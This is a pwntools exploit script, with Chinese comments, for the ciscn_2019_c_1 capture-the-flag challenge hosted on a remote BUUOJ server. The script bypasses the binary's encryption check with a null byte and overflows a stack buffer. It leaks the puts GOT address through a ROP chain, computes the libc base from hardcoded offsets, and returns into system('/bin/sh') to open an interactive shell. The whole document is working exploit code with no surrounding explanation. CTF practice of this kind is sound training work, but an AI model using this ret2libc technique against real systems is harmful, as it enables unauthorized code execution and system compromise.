from pwn import *

#r=process('./ciscn_2019_c_1')
r= remote("node5.buuoj.cn",29451)
context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)

pop_rdi=0x0400c83
puts_got=0x602020
puts_plt=0x04006E0
main=0x400B28

r.sendlineafter(b'choice!\n',b'1')
payload=b'\0'+b'a'*(0x50-1+8)   #首位填‘\0’,绕过加密，之后填上a覆盖到返回地址
payload+=p64(pop_rdi)
payload+=p64(puts_got)   #设置rdi寄存器的值为puts的got表地址
payload+=p64(puts_plt)   #调用puts函数，输出的是puts的got表地址
payload+=p64(main)       #设置返回地址，上述步骤完成了输出了puts函数的地址，我们得控制程序执行流
                         #让它返回到main函数，这样我们才可以再一次利用输入点构造rop 

r.sendlineafter(b'encrypted\n',payload)
print(r.recvline())
print(r.recvline())

puts_addr=u64(r.recvuntil(b'\n')[:-1].ljust(8,b'\0'))#接收程序返回的地址
                                                   #lijust（8，‘\0’）,不满8位的用0补足
print(hex(puts_addr))
# libc=ELF('./libc6_2.27-0ubuntu3_amd64.so')
# print(libc.symbols['puts'])

system_off=	0x04f440
libc_addr=puts_addr-0x0809c0
print(r.recvline())
print(r.recvline())

r.sendlineafter(b'choice!\n',b'1')

payload=b'\0'+b'b'*(0x50-1+8)+p64(0x04006b9)+p64(pop_rdi)+p64(libc_addr+0x01b3e9a)+p64(libc_addr+system_off)  
r.sendlineafter(b'encrypted\n',payload)
print(r.recvline())

r.interactive()
